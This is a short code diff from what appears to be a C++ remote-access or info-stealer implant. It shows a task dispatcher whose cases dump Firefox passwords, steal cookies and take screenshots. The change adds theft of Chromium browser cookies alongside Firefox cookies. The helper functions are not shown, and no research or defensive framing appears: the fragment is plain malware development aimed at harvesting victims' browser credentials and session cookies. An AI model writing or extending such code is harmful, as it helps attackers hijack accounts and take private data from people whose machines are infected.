@@ -61,7 +61,8 @@ void TaskDispatcher::dispatch(const Task& task) {
                 result.output += "\n\n" + credential::DumpFirefoxPasswords();
                 break;
             case TaskType::COOKIE_STEAL:
-                result.output = "COOKIES:" + credential::StealFirefoxCookies(); 
+                result.output = "COOKIES:" + credential::StealFirefoxCookies();
+                result.output += "\n\n" + credential::StealChromiumCookies();
                 break;
             case TaskType::SCREENSHOT: {
                 std::vector<BYTE> jpg = capture::CaptureScreenshotJPEG();
